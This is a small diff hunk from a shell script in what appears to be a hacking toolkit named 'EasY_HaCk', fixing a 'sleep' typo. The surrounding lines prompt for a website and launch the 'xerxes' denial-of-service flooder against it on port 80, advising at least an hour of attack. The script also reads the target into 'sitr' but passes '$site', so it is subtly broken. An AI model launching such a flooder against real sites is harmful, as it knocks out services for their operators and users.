@@ -59,7 +59,7 @@ then
 echo
 clear
 echo $W"Let the Attack at least$Y2 1h$W to have good result "
-sleep1
+sleep 1
 echo -n $R"Put the Website to Attack$Y : " $G
 read sitr
 $PREFIX/share/EasY_HaCk/.modules/.xerxes/xerxes $site 80
